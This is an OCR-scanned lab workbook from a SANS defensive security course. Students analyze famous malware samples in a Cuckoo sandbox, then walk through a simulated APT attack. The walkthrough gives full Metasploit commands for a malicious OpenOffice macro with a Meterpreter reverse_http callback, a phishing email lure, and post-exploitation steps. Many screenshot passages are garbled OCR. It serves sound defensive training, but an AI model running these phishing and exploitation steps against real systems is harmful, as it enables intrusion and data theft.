SECS99 I DEFEATING ADVANCED ADVERSARIES

,....

Workbook

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING. CERTIFICATION, AND RESEARCH I sans.org

Copyright© 2017, Erik Van Buggenhout & Stephen Sims. All rights reserved to Erik Van Buggenhout & Stephen Sims and/or SANS Institute.

PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE ASSOCIATED WITH THE SANS COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE "USER") AND THE SANS INSTITUTE FOR THE COURSEWARE. YOU AGREE THAT THIS AGREEMENT IS ENFORCEABLE LIKE ANY WRITTEN NEGOTIATED AGREEMENT SIGNED BY YOU.

With the CLA, the SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the terms of this agreement. Courseware includes all printed materials, including course books and lab workbooks, as well as any digital or other media, virtual machines, and/or data sets distributed by the SANS Institute to the User for use in the SANS class associated with the Courseware. User agrees that the CLA is the complete and exclusive statement of agreement between The SANS Institute and you and that this CLA supersedes any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.

BY ACCEPTING THIS COURSEWARE, YOU AGREE TO BE BOUND BY THE TERMS OF THIS

CLA. BY ACCEPTING THIS SOFTWARE, YOU AGREE THAT ANY BREACH OF THE TERMS

OF THIS CLA MAY CAUSE IRREPARABLE HARM ANO SIGNIFICANT INJURY TO THE SANS

INSTITUTE, AND THAT THE SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY

INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE,

OR OTHER EQUITABLE RELIEF.

·

If you do not agree, you may return the Courseware to the SANS Institute for a full refund , if applicable.

User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of the Courseware, in any medium whether printed, electronic or otherwise, for any purpose, without the express prior written consent of the SANS Institute. Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any way, shape, or form without the express written consent of the SANS Institute.

If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall be deemed to be severable from this CLA and shall not affect the remainder thereof. An amendment or addendum to this CLA may accompany this courseware.

SANS acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in this courseware are the sole property of their respective trademark/registered/copyright owners, including:

AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, ilife, iMac, iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac, Mac Logo, MacBook, MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina, Safari, Siri, Spaces, Spotlight, There's an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and iCloud are registered trademarks of Apple Inc.

Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA. SEC599_W_C01_03

SEC599-1.1: Exercise - Analyzing the behavior of famous malware
Objective
The objective of the lab is to analyze a number of known malware samples from the campaigns we briefly addressed above (including Wannacry, Notpetya, Shamoon,...). This will be your first interaction with the LODS environment, so the lab is designed to "get going" in a comfortable fashion!

Throughout the lab, we will rely on the open-source Cuckoo sandbox, which we will further

discuss in section 2 of this course. Cuckoo sandbox can be used to upload suspicious files,

,,. ....

after which it will perform both a static and dynamic-analysis of the file. After its analysis,

Cuckoo will provide you with a report that includes both the result of a static analysis (e.g.

including the results of strings), but also a dynamic analysis (including a memory dump, file

system access, the network connections opened,...)

The high-level exercise steps are the following:

· Authenticate to the Windows02 machine

, .......

· Mount the ISO containing the malware samples (CAREFUL- password is "infected"!)

· Upload the samples to Cuckoo sandbox

· Analyze & review the results

Note that some of the samples will not provide good results from the dynamic analysis: we are looking at some of the most advanced malware samples here, which have implemented several anti-sandboxing techniques! Again, the goal is to get accustomed to the LODS
platform!

Scenario

Virtual Machines

1. SEC599-C01 - Windows 2. SEC599-C01 - Firewall 3. SEC599-C01 - Ubuntu02 4. SEC599-C01 - DomainController

Exercise 1 : SEC599-1.1

The objective of the lab is to analyze a number of known malware samples from the campaigns we briefly addressed during the course (including Wannacry, Notpetya, Shamoon,...). This will be your first interaction with the LODS environment, so the lab is designed to "get going" in a comfortable fashion!

1. Authenticate to Windows02 You can authenticate to the Windows machine using the following credentials:

Username: Nick Fury Password: Awesomesauce123

© 2017 Erik Van Buggenhout & Stephen Sims

2. Extract the malware samples to Desktop
Throughout this lab, we will analyze a number of malware samples in our sandbox. The samples we will analyze are available on the "virtual DVD" that is mounted to the Windows machine. Please extract the contents of the zip to the Desktop. The password of the archive is "infected" (which is a common practice among malware researchers).

·Nii Homt

Shatt

V1tw

Comp1tl' rd Fo d,i rools l:Ytract

0

> This PC · DVD ORV1! (0:) Oayl

p

..t Qu,ck access

· Desktop

.,,

~ Downlo1d1 ~ Documents

.,,
,,

- Pictures

,if

t- Mus,c

Pnv1l~e Escalation
· Videos

6 Ond>nve

This PC

I} Network

FamousM.lware-Samples.z1p

11 2017.; 21 PM Compres eel (npp

4 907 KB

r

Eil Extract: O:\famousMalware·Samples.z,p

X

I Eondto

-----------Jvl [J

E2I Show Pasaword

OK

2

© 2017 Erik Van Buggenhout & Stephen Sims

3. Launch browser &amp; open Cuckoo Once the samples are extracted to the Desktop in the previous step, please open the browser (Chrome is pinned to the start bar). Our very own Cuckoo sandbox has been added as a bookmark in the bookmarks bar, please open Cuckoo's web interface. It is configured in Synctechlabs's CSOC network, having IP address 192.168.30.15 (listening on port 8000).
We will further discuss details on the setup of Cuckoo in day 2 of this course!
From https://cuckoosandbox.org/:
"In three words, Cuckoo Sandbox is a malware analysis system.
In other words, you can throw any suspicious file at it and in a matter of seconds Cuckoo will provide you back some detailed results outlining what such file did when executed inside an isolated environment.
Cuckoo Sandbox is a free software that automated the task of analyzing any malicious file under Windows, OS X, Linux, and Android."

4. Upload the samples to Cuckoo

Once the Cuckoo web page is loaded, click the submit file function in Cuckoo and select all previously extracted samples (in step 2) for upload. They should be located on the Desktop. Cuckoo supports a multi-file selection, so we can easily select all files and upload them at once.

)(

~

C (i) 192.168.30.1Seo00

f(J PIS,_f_... \(' C.aooS-

-.,.,._ ,l~· llr ~SJ>

e

,.,

* :

cuckpQ:: ·

;;;; Recent 0: Pending Q Search

.. . .,.

lnsi o,9af'k:e ·

,,_,o1c1..

V C,

p
0
T,pt

) .os_Sto« · ~b.nk.b.cbloo<"'
B l o c t. . . . .g y 4 ~ Ey<9y,1m,d-
· regm,e:e

8111120 75'l'PM ar.? ·1 ".AM 811 '11"06 PM 8/11/2017 &19 PM "212Cl71()~AM

OS.STORH Appltc M<rotCIII E
Aj,plic.r.,on

Stibmtt

Import

SUBMIT URLS/HASHES

· *ann.tCl't-ot

- V(

Alfil«
! Open
S~,mlnfo

lt!itll
v orc!id.lhelcOnlofflttla(e
mm

5. Analysis configuration

In the next screen, Cuckoo will allow you to further configure how the analysis

© 2017 Erik Van Buggenhout & Stephen Sims

3

should run. Typical items you can configure here include:
o Network routing: Would you like to allow the virtual analysis machine to access the Internet? This could provide better results, but also' carries the risk of alerting an adversary...
o Priority of the sample in the queue
o Timeout: Cuckoo either waits for the execution of the sample to stop or until the timeout has been fully completed. You can adapt this timeout to your liking.
If you upload multiple files, you can also define what files are to be analyzed. We will use default settings for our analysis, so we can select the blue button "Analyze" at the top right of the screen.

"

~

C <D 192.168.30.1ssooo u

f8 - -· - '< Cudcoo-

~wi ~-· ' log,n 'II MISll

cucll._oo ·:' · A Dashboard 5 Recent O: Pending Q Search

e

c, X

* :

Submll

1mpo,1

"' u,-f91·t ·
0: Con·1gure your Ana ys s

Htildftd

Cl Global Advanced Opllor.s
-0
-·
- ---

· CJ Blac,M.-qpls
· Cl Eyel')',a mo.,·.,
· Cl notpet)a.dll Cl · ,eq., o,a

Cl · shamoOn "'"

· I)

W.'.1111>.lC'y UP

0

476 0

717 s g O

Kl8

1JM.S O

3SJ 9 KiB 0

119Ki8 0 320 01(,8 0
·J . MiB 0

~ Selection

6. Play the waiting game
And now, we play the waiting game... The next screen will autorefresh and will show you the queue of samples in the engine. Should you have multiple analysis machines, the work will of course be distributed and you would receive faster results!
You don't have to wait for all of the samples to finish analysis/ execution, once the first sample is "reported", you can review its results. The next steps in this lab will provide you with a guided, quiz-like, tour of the Cuckoo report format.

4

© 2017 Erik Van Buggenhout & Stephen Sims

X
C © 192.168.30.ts IOO/subm,tJpOSl/t

e

c, X

* :

cue~·, ' · ft Dashboard ,a Recent O: Pending O. Search

Submit

Import

· s-y
~ Your submission has been received and the tasks are being processed! Nut vi... s-d"'9 ldl,,a s..1xru1agu,

Tasks: Fll''rewi evtsy 2 5 seconds

TNII Ill

o,..

_ ,UIII.

...._

=11/Ca/2011012-l<l

ban<.l'~i,_baci«i00f fill;>

~

011/Cl,"°PO IHO

S!il,i-4~"'°1,. I

3

=11/08i2til701:ol<l

~ ~ · u d ~. .

.......

0111()8!20170 12"1)

no1:pe,1v,('1

,-..

=11/Ca."~.Ol10 lZ 4<J

'll!'CJ''1 C".kt!'

6

0 11:1:8.'20!" 0 · .,,

VlilmOQf, t!'ff'

,,.._

7

011/Cllr.!U1' 0 124U

;war,rwc,yr· IP

°"""
-.

.......

7. Analyze the results

..,p~
,1.
...
d1I
....
...
···

-
· fun'lin';
·~· Pf<1d,'I)
·Pondin<I
-~· pe,tdir'I)
· l)ffld,'I)

Once a sample has finished its analysis phase and is reported, feel free to interact with Cuckoo and analyze the report. You will see that the analysis quality differs from sample to sample. You can find all reported samples under the "Recent" tab. Some of the interesting tabs in the report:

o Behavior analysis (what did the sample do?) o Network analysis (what kind of network traffic did the sample generate?) o Static analysis (including strings, antivirus checks, ...)

0

8. Bangladeshbank_ backdoor.exe
The sample retrieves additional stages from its C&C. As the C&C is currently offiine, it fails to do so and the analysis is thus limited. Can you find the URL that is hardcoded in the sample?
The solution is "update.toythieves.com". You could find it by analyzing the network traffic for an attempted DNS resolution or by going through the strings in the "Static analysis".

© 2017 Erik Van Buggenhout & Stephen Sims

5

Network Analysis

0 DNS

UDP

192 If>& 88 15.49631

192 168.88 1 53

'

. .- . ---...

. .- ' -

-.

112.161Jll.15:51711 - · 112.161.at:$:J I

, ,-

I :·

I ., I

· ". ·f

~,- . : · .' - · : · )

192 1618815·51101

192 168 88 1 :;3

192 168 88 15·53589

192 168 88. 1;~3

192168.88 15 ~703

19216888.1 53

92 1 88 15 88

Sutic.ta Snort
192 68

......... f,.U tlN tMl . . . . HM NH ,&,J'"'1, "'Ir ;; , ··· , , -"'~

"'J , . . . . . . 6P~ £.~1· ..~..f :l't~, HH iS'"''

tHl t!·.! trl· "'i,C

tete-N=t, i;:i,j etft ·1H fl

)I!., · ·

9. Blackenergy.xls
BlackEnergy.xls: Our analysis machine currently has no Microsoft Excel installed, so the analysis fails. This could be a potential improvement for our analysis machine! We have however configured our system in this way for a reason: We can still leverage the static analysis looking for hard-coded strings... Can you find the name of the executable that is used in the VBA code?
The solution is "vba_macro.exe". You could find it in the Static Analysis tab, either in the "Strings" section or in the "VBA" section, where the macro's are extracted and displayed.

6

© 2017 Erik Van Buggenhout & Stephen Sims

)(
C © \92.168.30.15 80vo'·nalyst!/21s1.tt1ci

CUC"-00'.:

o: fi Dashboard :ii Recent

Pending Q Search

e

X

*

...

,._ V

X

Inltl6 lnitl7 Jnltl8 ln1t19 In! t26 lnit2l Init22 Init23 Jnit24
Init2S fnu· · FreeFlle fnae - Environ("TIIP") & "\vb~_aac ~ n fn..., For 61nary As pfnua For i · 1 To 768
For j · e To 127 aa · a(i}(j) Put ri'oUII, , aa
1,ext j Next 1 Close ,rfnua 01· rss ru · Shell(fn"""', 1)

lnit17 lnl tl8 lnitl9 lnl t28 lnlUl lnit22 lnit23 tnlt24 Init2S fnlJII · freeFile foaN> · Env!ron("TMP") & "" \vba_..,,ro.en· Open fnaae For Binary As ·fnua For i · 1 To 768
For j · e To 127 ·· · a(i)(j) Put tfnua, , aa
Next j Next i Clo~ ·fnlJtl
Oi· rss
rss · Snell(fna"", 1)

© 2017 Erik Van Buggenhout & Stephen Sims

7

10. EyePyramid.exe Now this sample actually ran properly in our sandbox and provides us with a highly interesting dynamic analysis report. Take your time to browse through it. Can you tell us how it tries to achieve persistence?
It accesses a Windows registry key to create itself as a Windows service! As part of the "signatures", we can clearly see

cuc:l\pQ ·.__., ft Dashboard iii Reeent O: Pending 0. Search

Submit

O AUocat. . read-wnte ·etecut· me..-y (usually to unpack Itself) (1 -nt)

>

O Po1.ntlally INlicloua URu ,..,.. fwnd In lhe pra,cecs memory dump (50 out of 126 ewnts)

>

O Anemp11 10 iden~fy lrmahd AV products by INlali.lion directo,y (50 out of 60 eventa)

>

O Installs 11M11 to< - . u n at Wondo,,.. ltllflup (2 ..,.,,1s1

V

HK[Y_LOCALMACttlNE SYS,[M \ControlSel )01 \Se<VteeslW37T,me';l~alh

'\.SystemRootll:.1S1stc ... t\ets,cs

rellJ<ey 11KCY_lOCAL..MACHINE\SYST[M\Co'.lllolSe1001\Sen.1ee~1WJ2T1~\Par11mett!fs\SerticeOI 11!<1-VIIIUC ~emRootll.\Syste

..,_,II 0 0perat" on local ,.,_ell's poli,:I· and Nl1Jn9S (1

>

0 mod,fy. teCUnty_cenrar. warnings (23 ··.,,ta)

>

>

0 OtublH Windows Secumy 1..1u,e1 (I avents)

>

11. notpetya.dll As you will see, this sample is not properly ran by Cuckoo... You can skip this one for now... If you have extra time, try to get this sample to run by changing the analysis settings. Your instructor would be happy to support you :)
12. regin.exe Regin is a highly sophisticated malware believed to be developed by (or with the support) of a nation state. Due to its extensive anti-sandboxing technology the sample will not provide any good results in a standard Cuckoo setup...
13. shamoon.exe
The shamoon.exe sample doesn't like Cuckoo either and apparently refuses to execute... Can you however provide us with the compile time?
It seems the sample compile time was 2009-02- 15 07:30:41...

8

© 2017 Erik Van Buggenhout & Stephen Sims

/

SEC599-1.l: Exercise - Analyzing the behavior of famous malware

-----.;::-

~ .,w..,,, ·..,...,w, ....

..-,0 · ,._, ....... ·~

Static Analysis

Static Analysis Strings Ant1v1rus IRMA

PE Compile Time

PE lmphash

10b<:3~a592fSC1C9Si4.:SaadSbSal~

·

·

14. wannacry.exe
Now... This little sample makes quite a fuzz! Depending on Cuckoo's mood, this one could give you a malicious scoring of up to 16 out of 10 (the scoring system is still in Alpha mode). As you can see, ransomware typically doesn't really care too much about anti-sandboxing techniques (even if there was the "oh-so-famous kill-
switch"). It just likes to encrypt :) You might recognize the screenshots from
various news articles!

© 2017 Erik Van Buggenhout & Stephen Sims

9

This page intentionally left blank.

10

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-1.2: Exercise - One click is all it takes

Objective

The objective of this offensive lab is to obtain an in-depth understanding of how APT-style

attacks are launched against organisations. You will see the environment through the eyes

of the adversary, which will be fundamental to implement the right defences later on! ,,....

,,....

Scenario

You are part of a hacking group called APT-1337 (also known as "Feisty Chicken"), which focuses primarily on stealing research plans for newly developed military technology. After doing a market study, you've come accross synctechlabs.com, which is a defense contractor focusing on missile guidance systems.

Your mission is to perform an APT-style attack against synctechlabs.com, running through the various stages of the APT Attack Cycle:

,,....

· Reconnaissance

· Weaponization

· Delivery

· Installation

· Command & Control

· Actions On Target

Your mission is to obtain access to all information linked to project "Osprey", which is the codename for a new missile guidance software being developed by synctechlabs.com.

Your name is Jim Persons and you have a mailbox "jim.persons@feistymail.com" with password S3cr3t123. Your mailbox can be accessed on www.feistymail.com.

One of your fellow hackers got arrested recently, but already performed some reconnaissance for you:

· Their corporate web site is www.synctechlabs.com · The internal codename for the new missile guidance system is "Osprey"

can you pick up where he left off? Virtual Machines

1. SEC599-C01 - Firewall 2. SEC599-C01 - Ubuntu0l 3. SECS99-C01 - DomainController 4. SEC599-C01 - Windows0l 5. SECS99-C01 - Kali

Exercise 1 : SEC599-1.2

The objective of this offensive lab is to obtain an in-depth understanding of how APT-style

© 2017 Erik Van Buggenhout & Stephen Sims

11

attacks are launched against organisations. You will see the environment through the eyes of the adversary, which will be fundamental to implement the right defences later on!
1. Getting started - Kali Linux As a first step, let's authenticate to our Kali linux machine, which you can do using the following credentials: Username: root Password: sec599
2. Reconnaissance - Open the browser Once the Kali desktop has loaded, let's launch the Firefox browser that is included ! A shortcut to the Firefox browser can be found at the left of the screen, at the top of the menubar. Should you receive a "Well, this is embarrassing." screen, please ignore it (it's related to the Firefox cache, but doesn't affect our exercise) and just proceed with the next steps.
KALI LINUX KAI.I TOOLS KAI.I DOCUMENTATION OFFENSIVE SECURITY

3. Reconnaissance - www.synctechlabs.com So, let's have a look at the corporate website of our target: www.synctechlabs.com. A bookmark for the website has been added under the "APT-1337" bookmarks folder in Firefox.
Can you find some interesting information we can use to target them?

When you further investigate the corporate web site (www.synctechlabs.com), you can identify the following extra information:

o They are heavily recruiting and the corporate mail address for

12

© 2017 Erik Van Buggenhout & Stephen Sims

applications is jobs@synctechlabs.com o They appear to be using OpenOffice (see web site footer) This opens up some interesting opportunities... Let's see how we can leverage this information during t he weaponization phase!
Proudly presenting the technology we rely on!
Apache
Open OfficeTI<
4. Weaponization - Opening a terminal in Linux Let's start our weaponization phase! We will now leverage t he information we previously identified to penetrate the target organization. As a first step, let's launch a terminal in Kali, which you can do by clicking the terminal icon on the left-hand side of the screen (second in the menu bar). You should see a command prompt with a black background with the following prompt: root@kali:~#

© 2017 Erik Van Buggenhout & Stephen Sims

13

File Edit View Search Terminal Help

root@lk:all: -

0 0 0

5. Weaponization - Making sure our firewall is down During our attack, we are going to be compromising a system and have it connect back to us. For this to work, we need to ensure the victim can connect back to us. We will clean our iptables setup using the following commands (we will run them in the terminal we just opened):
root@kali:~# iptables -F root@kali:~# iptables -I INPUT -j ACCEPT
Note that Linux is case sensitive and thus the case of the commands, flags & parameters is important. Incorrect case usage will result in an error.

File Edit View Search Terminal Help

root@kali: -

6. Weaponization - Launching Metasploit

Once iptables has been configured in the previous step, we will start the Metasploit Framework console by clicking the Metasploit Framework shortcut on the left-hand side of the screen (4th icon in the menu bar). This will launch a new terminal

14

© 2017 Erik Van Buggenhout & Stephen Sims

window, in which the Metasploit console is started.
Once Metasploit has been launched (you will first see some debug metasploit info, after which ASCII art is generated), you will receive a metasploit prompt:
msf >
Metasploit is an exploitation framework, designed to facilitate the creation & use of exploits. One of its key strengths is that it has "standardized" the development of exploits t hrough its modular design!
While t his is not an offensive course, we will interact with Metasploit in this offensive lab, as we want to illustrate how easy adversaries can launch attacks against your environment.

.. ccccccccc cccccccccccccccccccccccccc cccccccccccccccccccccccccc

ffffffffffffffffffffffffff

ffffffff.

. .......... .

ffffffffffffffffffffffffff

ffffffff.

ffffffff ...... .

ffffffff ............... .

... - ' ~..,

\ ; ; I 1" ,-.

-[ lf1L.' e:·.plo1~·.
r 4 r',(1 I ·,-I~' I :·):: 1! ',
r F·,··· '·~f_·t,-1 ~,,(,:~ r \, · I :. --l ·,

t;-, t :,_, .

r ,;:, · ! '-;-·. ·. ~; ·

7. Weaponization - Finding an exploit
From our initial reconnaissance activities, we know that Synctechlabs uses OpenOffice! Let's explore Metasploit! We can do this by "searching" for the string "openoffice" from the Metasploit command line. This will list any matching modules. We can use the following command for this:
msf > search openoffice

As a result of this command, Metasploit should return the following modules:

© 2017 Erik Van Buggenhout & Stephen Sims

15

Matching Modules

o exploit/ multi/misc/ openoffice_document_macro o exploit/windows/ fileformat/ openoffice_ole

As seen in the different APT case studies, malicious macro's are a commonly used exploitation / delivery method!

File Edit View Search Terminal Help

Terminal

o e o

8. Weaponization - Selecting the exploit
We select the previously identified module by using the "use" statement in Metasploit
msf > use exploit/multi/misc/openoffice_document_macro
We can then list t he available options using the "show options" command :
msf exploit(openoffice_document_ macro) > show options
Required options that are to be set for our module include:
o FILENAME: The filename of our malicious document o SRVHOST: The IP Address the payload will connect back to (" Command &
Control" server) o SRVPORT: The port the Command & Control server will listen on

16

© 2017 Erik Van Buggenhout & Stephen Sims

We will configure these options in the next few steps!
Terminal

OE>O

9. Weaponization - Configuring the exploit (1)
The way this Metasploit module works, is that it will generate a malicious OpenOffice macro that will connect back to a hostname / IP address provided by the attacker. At the attacker side, a listener will be active, which will serve back a malicious payload in order to compromise the target machine.
We thus need to configure the macro that is being generated to connect back to the right system. In this case, this will be our own Kali Linux machine. We can immediately get to know our IP address from within Metasploit by running "ifconfig", which will be executed on the Operating System:
msf exploit(openoffice_document_macro) > ifconfig
Th.e resulting output is exactly the same as when running the ifconfig command at the OS terminal. As a result, you should see that our IP address is 10.10.10.15.

© 2017 Erik Van Buggenhout & Stephen Sims

17

10. Weaponization - Configuring the exploit (2)
Now we know our own IP address, let's start configuring the exploit module! Note that we will attempt to send a fake application to t he jobs@synctechlabs.com address that we discovered. We will thus use an HR-themed attack:
o FILENAME: CV.odt o BODY: "Dear, I would hereby like to apply for a position at
www.synctechlabs.com. Please find my CV attached, I look forward
answering any questions you may have!"
o SRVPORT: 8080 o SRVHOST: 10.10.10.15
The options can be configured by using t he "set" keyword, we will thus run the following 4 commands in t he Metasploit window:
msf exploit(openoffice_document_ macro) > set SRVPORT 8080 msf exploit(openoffice_document_ macro) > set FILENAME CV.odt msf exploit(openoffice_document_macro) > set SRVHOST 10.10.10.15 msf exploit(openoffice_document_ macro) > set BODY "Dear, I would hereby
like to apply for a position at www.synctechlabs.com. Please find my CV attached, I look forward answering any questions you may have!"
We are using IP address 10.10.10.15 and port 8080 to connect back to our Kali Linux machine.

18

© 2017 Erik Van Buggenhout & Stephen Sims

File Edit View Seaich Temunal Help

Tenn,nal

0 E).

11. Weaponization - Selecting the payload
Now the exploit is configured, we need to add a payload ("What do we want to do with our exploit?"). We are going to select the "Meterpreter", which is a highly optimized shell environment that has built-in capabilities for a wide variety of attacking steps (e.g. stealing of stored passwords, dumping of credentials & hashing, keylogging, stealing of bitcoins,...).
In our attack, we will launch the Meterpreter using a reverse_http stager. This means that the infected machine will use a Command & Control channel over HTTP, which is a common attack strategy by adversaries.
msf exploit(openoffice_document_ macro) > set PAYLOAD
windows/meterpreter/ reverse_http
When running the show options command again, some additional, payload-specific, options have popped up!
msf exploit(openoffice_document_ macro) > show options
The following are key options we need to configure:
o EXITFUNC: the exit technique used by the payload, we will use the standard, default, technique
o LHOST: the local listener IP address for the Meterpreter C&C channel o LPORT: the local listener port for the Meterpreter C&C channel

© 2017 Erik Van Buggenhout & Stephen Sims

19

12. Weaponization - Configuring the payload
Once the payload is selected, we will configure the following options:
o LHOST: 10.10.10.15 o LPORT: 8081 Note that we are not configuring the EXITFUNC options, which will make Metasploit configure it using the default technique, which is fine for our attack. We can configure the other options by again using the "set" command:
msf exploit(openoffice_document_ macro) > set LHOST 10.10.10.15 msf exploit(openoffice_document_ macro) > set LPORT 8081
We are using 8081 as the port for our Meterpreter Command & Control channel. We cannot reuse port 8080, as this one is already used in the initial stage of our attack.

20

© 2017 Erik Van Buggenhout & Stephen Sims

13. Weaponization - Validating options
This concludes all required configuration steps. Let's now validate that all settings are correct by running the "show options" command:
msf exploit(openoffice_document_ macro) > show options
Due to the size & length of the output, you will have to scroll a little bit (or enlarge the size of your terminal window), but this command should return the following values:
o SRVHOST: 10.10.10.15 o SRVPORT: 8080 o FILENAME: CV.odt o BODY: "Dear, I would hereby like to apply for a position at
www.synctechlabs.com. Please find my CV attached, I look forward answering any questions you may have!" o LHOST: 10.10.10.15 o LPORT: 8081

© 2017 Erik Van Buggenhout & Stephen Sims

21

14. Weaponization - Launching the exploit
Once you have validated all options in the previous step, we can run the "exploit" command in Metasploit, which will launch our attack:
msf exploit(openoffice_document_ macro) > exploit
In this specific case, Metasploit will generate a .odt file (OpenOffice Word file) that we still need to send to our victim. In your output, you should also see the fact that the required handlers are being launched by Metasploit (it launches listeners for the reverse HTTP connections that will connect back to us).
At the end of the output, Metasploit will now start waiting for the connection to come back (which will only happen once the macro is executed). Do not close the Metasploit terminal window, as we will now progress to the next steps!

22

© 2017 Erik Van Buggenhout & Stephen Sims

Terml...t

oeo

15. Delivery - File output
We will first copy our file from the standard Metasploit output directory to our root Desktop. Open a new Terminal (again, DO NOT CLOSE the Metasploit terminal window) and run the following command:
root@kali:~# mv /root/.msf4/local/CV.odt /root/Desktop/CV.odt
Once this command is run in a new terminal window, the CV.odt file should appear on the Desktop of your virtual machine.
16. Delivery - Access the phising mailbox
We will access the phishing mailbox that was already created by our fellow hacker. The mailbox can be accessed by:
o Launching Firefox (first icon in the shortcut tab on the left of the screen) o Selecting the "Webmail - Feistymail" bookmark under the APT-1337
bookmark folder

© 2017 Erik Van Buggenhout & Stephen Sims

23

Roundcube Webmall :: Welcome to Roundcube Webmail · Mozilla Firefox

0

Q Webmai',t· Fe1styMa1l di Synclec Webmall · FeistyMall
Open AU https:l/127.0.0.l/maiV

--
17. Delivery - Log into the phising mailbox
We will access the phishing mailbox that was already created by our fellow hacker! The mail platform is hosted by the attacker on https://127.0.0.1/mail! (a bookmark in Firefox is available under the APT-1337 folder)
The phishing mailbox that was set up aims to mimic a person called "Jim Persons" that would like to apply for a position at SyncTechLabs. It's credentials are the following:
User: jim.persons@feistymail.com Password: S3cr3t123

24

© 2017 Erik Van Buggenhout & Stephen Sims

Roundcube Webmall :: Welcome to Roundcube Webmall - Mozilla Firefox
Q Roundcube Webma1l :_ ,c +
*
APT-1337 ·
roundcube C>
j m personsOleGrymeJ.eom
.·.·..... ~
18. Delivery - Creating the phising email
Once authenticated, the platform will redirect you to the inbox of the jim.persons@feistymail.com user. Let's get creative and send in our application! You can just hit the "Compose" button. We will send a mail with the following options: TO: jobs@synctechlabs.com SUBJECT: Application BODY: Dear HR department, my name is Jim Persons and I'd like to apply for a position at SyncTechlabs. Please find attached my resume. I look forward discussing my experience and expertise during an interview! Best regards, Jim Persons. We will of course attach the CV.odt file that was generated by Metasploit as well. In the "attachment" window that pops up, please browse to the Desktop folder and select the "CV.odt" file there. Once the e-mail is sent, please return to the Metasploit terminal window!

© 2017 Erik Van Buggenhout & Stephen Sims

25

0 Roundcu~ Webmall :_ x +

Roundc:ube Webman :: Compose - Mozilla Firefox

0 8 0

APT-1337·
e ro undcube

(!) I ·J ,:
·:<.:· .1. · . 0 ..

· ·

Q.

To

0 M:IC O "di!

0 ,oJ

To 0

~I

A!Jplul..,

Edl:,ll)a;,of Plorl. .1 · J l'lut)' L,!~ ., j
·J .., S<we·m-11(Seo1 -

C R.unr«:.a

Deir If\ dP.partaenl,

1+f na,ae U h11 P~rs0<1s and I d like to apply for 1 posiuon al ~~- Please find attached ay res.- . l look fon;ard discussing ,ry ex~nence and
ex~rt1se during an 1.11terv1N1

Best regards,

M&,,nun -

flo 11:~ · 2.0 tm

1 1 A4od, · fje
CVodt (SICBJ

· ·

19. Delivery - Waiting Game Once the phishing mail is sent, the attacker has to wait for the victim to open the mail and the attachment.
Several things could go wrong now:
o The attachment might be blocked by a network-based security control (e.g. mail gateway, I PS,...)
o The user might not trust the attachment and decide not to open it... o The user might simply not be available and not open / forget about the mail
0
Luckily for us, the jobs mailbox appears to be quite well monitored and the mail is opened in a rather short timeframe!

20. Exploitation - Interacting with meterpreter
The initial message tells us a "Meterpreter session 1" was opened. Feel free to hit "ENTER" a couple of times, until! you receive an msf prompt again. We can now interact with t his session by using the "sessions -i 1" command (i for interact and 1 for session 1):
msf exploit(openoffice_document_ macro) > sessions -i 1
The meterpreter command we can then run is "sysinfo", which will provide some basic information on the system:

26

© 2017 Erik Van Buggenhout & Stephen Sims

meterpreter > sysinfo
In order to know more about the possibilities in the meterpreter, you can run the "help" command. Again, we will only use some basic meterpreter functionality, as this is not an offensive/ penetration testing course.

,,....

Terminal

File Edit View Search Terminal Help

oeo

21. Exploitation - Further Enumeration
Once the meterpreter is up and running, we can use different commands to obtain information on our victim:
o The "getuid" command tells us we are currently running with the privileges of user dwight.schrute, part of the SYNCTECHLABS Windows domain. We are thus running in a normal user context and it doesn't appear we have local administrator privileges;
o The "ipconfig" reveals our internal IP address is 192.168.10.15
Again, note that this is only a very small selection of modules that can be used when the meterpreter is running.

© 2017 Erik Van Buggenhout & Stephen Sims

27

1· t · , ! ~;1 E r_ t H ;. !i , , 1! ,.. : . ; 1 · t:·I ··1· · 1 1

r ·: ! ; ~ .

~.'·I \· 11, -, ~-- J <..

· oo O

t .. -0 ·

0t o I

· · 0t

·· 0·

o~· 0

' · to

+ +o f

: · · ~. f ·
11 1 ) .. 1 it· f',:., !'111
;. '. ) ' .
',·'.··- I
·' ·' ·, :-1't

I'"'' l ·.'

'_,1; d.' .'···

· · · · · ' . · .. ,.... , , ll · ,....

22. Exploitation - Metasploit post-exploitation
The meterpreter is running fine, but it's not yet persistent. .. If the user shuts down t he system, we will lose our connection! The Metasploitpost-exploitation modules can help us with this. The Metasploit post-exploitation modules are divided in three main categories: Gat her, Manage, Escalate.
I n order to access the post-exploitation modules, we must first background our meterpreter session, which will drop us again at the previous Metasploit prompt:
meterpreter > background msf exploit(openoffice_document_ macro) >
The post-exploitation modules are stored under the " post/" section.
,.. Terminal
File Edit View Search Terminal Help

23. Installation - Looking for persistence...

Once our meterpreter session is backgrounded, we can again leverage the search function in Metasploit:

We can use the "platform:windows" tag in the search command to look for the keyword "persistence". Note that the "exploit/" modules listed here can also be used in combination with our existing meterpreter.

28

© 2017 Erik Van Buggenhout & Stephen Sims

msf exploit(openoffice_document_ macro) > search platform:windows
persistence The search command will return a number of different persistence mechanisms t hat could be selected.
,-..
